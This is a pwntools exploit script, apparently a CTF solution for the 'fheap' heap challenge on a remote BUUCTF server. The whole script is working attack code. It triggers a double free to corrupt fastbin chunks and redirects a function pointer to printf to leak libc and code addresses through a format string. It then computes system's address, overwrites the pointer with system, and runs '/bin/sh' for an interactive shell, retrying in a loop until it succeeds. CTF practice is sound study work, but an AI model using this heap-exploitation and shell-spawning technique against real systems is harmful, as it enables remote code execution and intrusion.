from pwn import *
filename="./fheap"
libc_name="./libc-2.23.so"
# io = process(filename)
# io = remote('node4.buuoj.cn',25001)
# context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']

def choice(ch):
    io.sendlineafter('3.quit\n',str(ch))

def create(size,payload):
    choice('create ')
    io.recvuntil('Pls give string size:')
    io.sendline(str(size))
    io.recvuntil('str:')
    io.send(payload)

def delete(id):
    choice('delete ')
    io.recvuntil('id:')
    io.sendline(str(id))
    io.recvuntil('Are you sure?:')
    io.sendline('yes')

def debug():
    cmd = ""
    # cmd +="brva 0xDAF" # b delete
    # cmd +="brva 0xE93" #b call rax
    cmd += "brva 0x10E2" # b create end
    gdb.attach(io,cmd)
    # delete(0)

def debug_call_rax():
    gdb.attach(io,"brva 0xE93")

def debug_create_end():
    gdb.attach(io,"brva 0x10E2")


og = [0x45216,0x4526a,0xf02a4,0xf1147]

def exp(io):
    print(hex(elf.plt['puts']))
    create(0x68,'a'*12) #0
    create(0x68,b'a'*8+p64(0)) #1
    create(0x68,b'a'*8+p32(0x31)) #2
    create(0x68,p64(0)+p32(0)) #3, clear buf
    delete(0)
    # debug()
    delete(1)
    # gdb.attach(io,"brva 0xe93") # b call rax
    delete(0)
    # debug()
    # debug()
    # debug_create_end()
    create(0x68,p8(0x40)) #0
    # debug()
    create(0x68,b'%21$p%p;'+ p32(0x31)) #1
    # debug()
    create(0x68,'a')
    # gdb.attach(io,"brva 0x10E2\nbrva 0xE93") # change printf and break at call rax
    # gdb.attach(io,"brva 0x10E2\n") # change printf 
    create(0x68,'a'*0x8+'\xd0\x09\x40\x00') # change chunk1's fp to printf #4,change 1's fp
    try:
        delete(1) # check printf
        io.recvuntil('0x')
        libc_info = int(io.recvuntil('0x',drop=True),16)
        code_info = int(io.recvuntil(';',drop=True),16)
    except:
        io.close()
        return 0
    bias1 = 0x078bff
    bias2 = 0x0012b3
    # heap_info = int(io.recvuntil('11.',drop=True),16)
    success("libc_info: " + hex(libc_info))
    success("code_info: " + hex(code_info))
    # success("heap_info: " + hex(heap_info))
    libc_base = libc_info - bias1
    code_base = code_info - bias2
    # heap_base = heap_info - bias3
    success("libc_base: " + hex(libc_base))
    success("code_base: " + hex(code_base))
    free_hook = libc_base + libc.symbols['__free_hook']
    system = libc_base + libc.symbols['system']


    # write /bin/sh

    delete(3)
    delete(4)
    delete(3)
    create(0x68,'\x30\x00')
    create(0x68,'/bin/sh\x00')
    create(0x68,p64(0)+p32(0))
    create(0x68,'/bin/sh\x00') # change to /bin/sh;


    # first write/bin/sh, then change to system
    # change to system
    # gdb.attach(io,"brva 0x10E2\nbrva 0xE93") # change printf and break at call rax
    delete(0)
    delete(5)
    create(0x68,b'a'*0x8+p64(system)[0:6]+b'\x00') # write system,chunk inside 0
    # change with /bin/sh
    delete(6)
    io.interactive()




if __name__ == "__main__":
    result = 0
    cnt = 1
    while(result!=1):
        print("time: ",cnt)
        # io = process(filename)
        io = remote('node4.buuoj.cn',25001)
        result = exp(io)




